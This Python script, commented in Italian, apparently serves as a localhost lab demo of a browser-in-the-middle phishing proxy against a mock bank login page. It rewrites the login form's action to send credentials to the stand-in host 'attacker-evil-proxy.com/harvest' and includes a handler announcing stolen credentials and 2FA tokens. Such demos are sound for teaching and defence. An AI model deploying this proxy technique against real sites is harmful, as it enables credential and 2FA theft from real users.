from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import urllib.request

class BitMProxyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/login" or self.path == "/":
            try:
                # Recupera l'HTML originale dal server target legittimo (porta 5000) con timeout di 3s
                print("[BitM Proxy 5001] Fetching target page from http://127.0.0.1:5000/login ...")
                req = urllib.request.urlopen("http://127.0.0.1:5000/login", timeout=3.0)
                original_html = req.read().decode("utf-8")

                # Iniezione BitM: Cambia l'action della form per inviare le credenziali al server dell'attaccante
                proxied_html = original_html.replace(
                    'action="http://localhost:5000/dashboard"',
                    'action="http://attacker-evil-proxy.com/harvest"'
                )

                # Aggiunge marcatore proxy
                proxied_html = proxied_html.replace(
                    '<h2>Banca Sicura Login</h2>',
                    '<h2>Banca Sicura Login</h2><!-- BITM PROXY INJECTED -->'
                )

                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(proxied_html.encode("utf-8"))
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                err_html = f"<h1>Errore Proxy BitM</h1><p>Assicurati che il server target sia attivo sulla porta 5000! Dettaglio: {e}</p>"
                self.wfile.write(err_html.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/harvest":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1 style='color:red;'>[BITM HARVEST] Credenziali e Token 2FA Rubati dal Proxy Reverse!</h1>")

    def log_message(self, format, *args):
        print(f"[BitM Proxy 5001] {args[0]}")

if __name__ == "__main__":
    server = ThreadingHTTPServer(("127.0.0.1", 5001), BitMProxyHandler)
    print("=== Simulated BitM Proxy attivo su http://localhost:5001/login ===")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer arrestato.")
